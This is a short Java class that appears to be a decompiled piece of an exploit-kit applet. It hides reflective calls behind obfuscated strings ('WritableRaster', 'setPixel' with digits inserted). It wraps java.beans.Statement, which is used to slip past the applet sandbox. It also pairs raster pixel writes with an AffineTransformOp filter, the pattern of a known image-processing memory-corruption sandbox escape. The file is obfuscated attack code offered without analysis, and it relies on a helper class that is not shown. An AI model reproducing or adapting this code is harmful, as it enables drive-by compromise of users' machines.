import java.awt.geom.AffineTransform;
import java.awt.image.AffineTransformOp;
import java.awt.image.BufferedImage;
import java.beans.Statement;

public class stac {
    public static Object stacO(Object paramObject, String paramString, Object[] paramArrayOfObject) throws Exception {
        return new Statement(paramObject, paramString, paramArrayOfObject);
    }

    public static Object stac9(Object paramObject) {
        return ((Statement) paramObject).getTarget();
    }

    public static void stac1(Object paramObject) {
        try {
            ((Statement) paramObject).execute();
        } catch (Exception exception) {
        }
    }

    static void turk(BufferedImage paramBufferedImage) throws Exception {
        Issue.getMd(Issue.imgExt(Issue.csfn("11W1r112it1a1122b3l1e123R1a1s12t31e1r")),
                Issue.csfn("11s121e11t112P131i2x2e12l"), paramBufferedImage.getRaster(),
                new Class[] { int.class, int.class, int[].class },
                new Object[] { Integer.valueOf(0), Integer.valueOf(0), { -1, -1, -1, -1 } });
    }

    static void atfo(BufferedImage paramBufferedImage1, BufferedImage paramBufferedImage2) throws Exception {
        (new AffineTransformOp(newAtfo(), null)).filter(paramBufferedImage1, paramBufferedImage2);
    }

    static AffineTransform newAtfo() {
        return new AffineTransform(1.0F, 0.0F, 0.0F, 1.0F, 0.0F, 0.0F);
    }
}
